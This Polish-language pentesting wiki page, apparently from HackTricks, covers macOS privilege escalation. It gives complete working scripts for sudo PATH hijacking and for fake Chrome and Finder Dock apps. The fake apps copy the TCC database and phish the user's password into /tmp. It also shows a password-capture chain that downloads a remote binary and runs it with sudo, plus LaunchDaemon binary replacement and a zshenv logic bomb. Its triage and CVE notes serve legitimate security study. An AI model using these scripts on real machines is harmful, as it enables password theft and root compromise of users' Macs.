# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Jeśli szukasz informacji o TCC privilege escalation, przejdź do:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Wiele technik privilege escalation, które dotyczą systemu Linux lub innych systemów uniksopodobnych, ma również zastosowanie w macOS. Zobacz:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interakcja z użytkownikiem

### Sudo Hijacking

Oryginalną [technikę Sudo Hijacking znajdziesz w artykule Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Jednak macOS **zachowuje** **`PATH`** użytkownika, gdy wykonuje on **`sudo`**. Oznacza to, że innym sposobem przeprowadzenia tego ataku byłoby **przejęcie innych plików binarnych**, które ofiara nadal będzie wykonywać podczas **uruchamiania sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Zauważ, że użytkownik korzystający z terminala będzie z dużym prawdopodobieństwem miał **zainstalowany Homebrew**. Możliwe jest więc przejęcie binariów w **`/opt/homebrew/bin`**.

### Dock Impersonation

Wykorzystując **social engineering**, można **podszyć się na przykład pod Google Chrome** w Docku i faktycznie uruchomić własny skrypt:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Kilka sugestii:

- Sprawdź w Docku, czy znajduje się Chrome, a jeśli tak, **usuń** ten wpis i **dodaj** **fałszywy** wpis **Chrome** w tej samej pozycji w tablicy Docka.

<details>
<summary>Skrypt do podszywania się pod Chrome w Docku</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Kilka sugestii:

- **Nie można usunąć Findera z Docka**, więc jeśli zamierzasz dodać go do Docka, możesz umieścić fałszywego Findera tuż obok prawdziwego. W tym celu musisz **dodać wpis fałszywego Findera na początku tablicy Docka**.
- Inną opcją jest nieumieszczanie go w Docku i po prostu jego otwarcie — komunikat „Finder chce sterować Finderem” nie jest aż tak dziwny.
- Inną opcją **eskalacji do roota bez pytania** o hasło za pomocą okropnego okna jest sprawienie, aby Finder rzeczywiście poprosił o hasło w celu wykonania uprzywilejowanej akcji:
- Poproś Findera o skopiowanie nowego pliku **`sudo`** do **`/etc/pam.d`** (monit o hasło będzie informował, że „Finder chce skopiować sudo”).
- Poproś Findera o skopiowanie nowego **Authorization Plugin** (możesz kontrolować nazwę pliku, dzięki czemu monit o hasło będzie informował, że „Finder chce skopiować Finder.bundle”).

<details>
<summary>Skrypt podszywania się pod Finder w Docku</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing z użyciem promptu hasła + ponowne użycie sudo

Malware często wykorzystuje interakcję użytkownika do **przechwycenia hasła użytkownika uprawnionego do sudo** i programowego ponownego jego użycia. Typowy przebieg:

1. Zidentyfikuj zalogowanego użytkownika za pomocą `whoami`.
2. **Powtarzaj prompty hasła** do momentu, aż `dscl . -authonly "$user" "$pw"` zwróci powodzenie.
3. Zapisz credential w cache (np. `/tmp/.pass`) i wykonuj uprzywilejowane działania za pomocą `sudo -S` (hasło przez stdin).

Przykładowy minimalny łańcuch:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Skradzione hasło można następnie ponownie wykorzystać do **wyczyszczenia kwarantanny Gatekeepera za pomocą `xattr -c`**, kopiowania LaunchDaemons lub innych uprzywilejowanych plików oraz uruchamiania dodatkowych etapów w sposób nieinteraktywny.<sup>[[1]](#references)</sup>

## Nowsze wektory specyficzne dla macOS (2023–2026)

### Przestarzałe `AuthorizationExecuteWithPrivileges` nadal możliwe do użycia

`AuthorizationExecuteWithPrivileges` zostało oznaczone jako przestarzałe w wersji 10.7, ale **nadal działa w Sonoma/Sequoia**. Wiele komercyjnych updaterów wywołuje `/usr/libexec/security_authtrampoline` z niezaufaną ścieżką. Jeśli docelowy plik binarny jest zapisywalny przez użytkownika, możesz umieścić tam trojana i wykorzystać prawidłowy prompt:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Połącz z **powyższymi trikami masquerading**, aby wyświetlić wiarygodny dialog hasła.


### Triage uprzywilejowanego helpera / XPC

Wiele współczesnych privescs w macOS pochodzących od firm trzecich opiera się na tym samym schemacie: **rootowy LaunchDaemon** udostępnia usługę **Mach/XPC** z **`/Library/PrivilegedHelperTools`**, a następnie helper albo **nie weryfikuje klienta**, weryfikuje go **zbyt późno** (wyścig PID), albo udostępnia **rootową metodę**, która przyjmuje ścieżkę/skrypt kontrolowany przez użytkownika. To właśnie klasa błędów stojąca za wieloma niedawnymi błędami helperów w klientach VPN, launcherach gier i updaterach.<sup>[[2]](#references)</sup>

Szybka lista kontrolna triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Zwróć szczególną uwagę na helpery, które:

- nadal akceptują żądania **po odinstalowaniu**, ponieważ zadanie pozostało załadowane w `launchd`
- wykonują skrypty lub odczytują konfigurację z **`/Applications/...`** albo innych ścieżek zapisywalnych przez użytkowników innych niż root
- polegają na walidacji peerów opartej na **PID** lub wyłącznie na **bundle-id**, która może być podatna na race condition

Więcej informacji na temat błędów autoryzacji helperów znajdziesz na [tej stronie](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Dziedziczenie środowiska skryptu PackageKit (CVE-2024-27822)

Do czasu naprawienia tego problemu przez Apple w wersjach **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5**, instalacje inicjowane przez użytkownika za pomocą **`Installer.app`** / **`PackageKit.framework`** mogły wykonywać **skrypty PKG jako root w środowisku bieżącego użytkownika**. Oznaczało to, że pakiet używający **`#!/bin/zsh`** ładowałby **`~/.zshenv`** atakującego i uruchamiał go jako **root**, gdy ofiara instalowała pakiet.<sup>[[3]](#references)</sup>

Jest to szczególnie interesujące jako **logic bomb**: potrzebujesz jedynie foothold w koncie użytkownika oraz zapisywalnego pliku startowego powłoki, a następnie czekasz, aż użytkownik uruchomi dowolny podatny instalator oparty na **zsh**. Zasadniczo nie dotyczy to wdrożeń **MDM/Munki**, ponieważ działają one w środowisku użytkownika root.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Jeśli chcesz dokładniej zapoznać się z nadużyciami specyficznymi dla Installer, sprawdź również [tę stronę](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Kolizja docelowej lokalizacji Installer za pośrednictwem `.localized`

Niektóre instalatory firm trzecich rejestrują główny LaunchDaemon, którego plik wykonywalny jest wskazywany za pomocą stałej ścieżki wewnątrz `/Applications/Target.app`. Jeśli attacker może najpierw utworzyć ten bundle z **innym bundle identifier**, Installer może zachować przynętę i umieścić prawdziwą aplikację w `/Applications/Target.localized/Target.app`. Daemon nadal wskazuje oryginalną ścieżkę. W rezultacie plik wykonywalny kontrolowany przez attackera, znajdujący się wewnątrz decoy bundle, może później zostać uruchomiony jako root.<sup>[[8]](#references)</sup>

Wymagane warunki wstępne to:<sup>[[8]](#references)</sup>

1. Attacker może utworzyć oczekiwaną ścieżkę aplikacji lub przejąć nad nią kontrolę.
2. Pakiet nie usuwa kolidującego bundle.
3. Privileged job używa hard-coded path wewnątrz tego bundle.
4. Użytkownik lub workflow MDM instaluje pakiet i rejestruje job.

Szukaj przeniesionych bundle, a następnie przejrzyj cele LaunchDaemon za pomocą pętli enumeracyjnej w następnej sekcji:<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
Bezpieczniejszy installer rozwiązuje ostateczną lokalizację bundle i przechowuje uprzywilejowane executable w lokalizacji należącej do root, takiej jak `/Library/PrivilegedHelperTools`. Powinien również sprawdzić ownership i code signing przed zarejestrowaniem lub uruchomieniem joba.<sup>[[8]](#references)</sup>

### Przejęcie zapisywalnego celu LaunchDaemon

Plik plist LaunchDaemon może należeć do root, podczas gdy jego `Program` lub pierwszy wpis `ProgramArguments` wskazuje na katalog zapisywalny przez użytkownika. Sprawdź **całą ścieżkę**, a nie tylko uprawnienia executable. Jeśli katalog nadrzędny jest zapisywalny, attacker może zmienić nazwę executable należącego do root i utworzyć replacement pod tą samą ścieżką. Replacement zostanie uruchomiony jako root przy następnym starcie joba. Wystarczy reboot lub zwykły restart service. Attacker nie potrzebuje uprawnień do uruchomienia `launchctl bootstrap` w system domain.<sup>[[7]](#references)</sup>

Najpierw wylicz każdy target i jego bezpośredni katalog nadrzędny:<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
Gdy plik lub jego katalog nadrzędny jest zapisywalny, zachowaj oryginalny binary i zastąp ścieżkę wykonywalnym payloadem. Następnie poczekaj, aż już załadowany daemon uruchomi się ponownie.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

Podatna ścieżka `kauth_cred_proc_update` aktualizowała `proc_ro.p_ucred` za pomocą nieatomowego API `zalloc_ro_mut`, podczas gdy czytniki SMR ładowały wskaźnik bez blokady. Publiczny trigger korzysta ze specjalnie przygotowanego pliku binarnego setgid. Jeden wątek przełącza się między rzeczywistymi a efektywnymi identyfikatorami grup, podczas gdy inny wątek wielokrotnie wykonuje syscall, taki jak `getgid()`.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
Potraktuj to jako **race primitive**, a nie gotowy **root exploit**. Opublikowany PoC demonstruje rozdarty wskaźnik poświadczeń. Zwykle kończy się to **kernel panic**. Badacz odtworzył korupcję wyłącznie na platformie Intel i nie zapewnił deterministycznej kontroli nad wynikowym obiektem poświadczeń. Apple zmieniło aktualizację na atomową zamianę wskaźnika w macOS 15.3.<sup>[[4]](#references)</sup>

### Ominięcie SIP za pomocą Migration Assistant („Migraine”, CVE-2023-32369)

Jeśli masz już **root**, SIP nadal blokuje zapisy w lokalizacjach systemowych. **Migraine** wykorzystuje entitlement Migration Assistant `com.apple.rootless.install.heritable` do uruchomienia procesu potomnego, który dziedziczy możliwość ominięcia SIP i nadpisuje chronione ścieżki (np. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Łańcuch wygląda następująco:

1. Uzyskaj **root** w działającym systemie.
2. Uruchom `systemmigrationd` ze spreparowanym stanem, aby wykonać binarium kontrolowane przez atakującego.
3. Użyj odziedziczonego entitlementu do zmodyfikowania plików chronionych przez SIP, uzyskując persistence nawet po restarcie.

### Przemycanie wyrażeń NSPredicate/XPC (klasa błędów CVE-2023-23530/23531)

Wiele daemonów Apple akceptuje obiekty **NSPredicate** przez XPC i weryfikuje wyłącznie pole `expressionType`, które może być kontrolowane przez atakującego. Tworząc predicate, który ewaluje dowolne selektory, można uzyskać **code execution w usługach root/system XPC** (np. `coreduetd`, `contextstored`). W połączeniu z początkowym ominięciem app sandbox zapewnia to **privilege escalation bez monitów użytkownika**. Szukaj endpointów XPC, które deserializują predicate i nie mają solidnego visitora.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - ominięcie TCC przez mount_apfs i privilege escalation

**Dowolny użytkownik** (nawet bez uprawnień) może utworzyć i zamontować snapshot Time Machine za pomocą `-o noowners` oraz **uzyskać dostęp do WSZYSTKICH plików** tego snapshotu, omijając kontrole własności na aktywnym woluminie. Jedynym wymaganym uprawnieniem jest posiadanie przez używaną aplikację (np. `Terminal`) dostępu **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Polecenia i pełne wyjaśnienie znajdują się na stronie dotyczącej omijania TCC:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informacje wrażliwe

Może to być przydatne do eskalacji uprawnień:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, rok Infostealerów](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Local Privilege Escalation w AWS Client VPN dla macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: Privilege Escalation w macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft „Migraine” - ominięcie SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Nowa klasa błędów Privilege Escalation w macOS i iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Przejęcie LaunchDaemon: privilege escalation i persistence przez niebezpieczne uprawnienia folderu](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE przez katalog .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
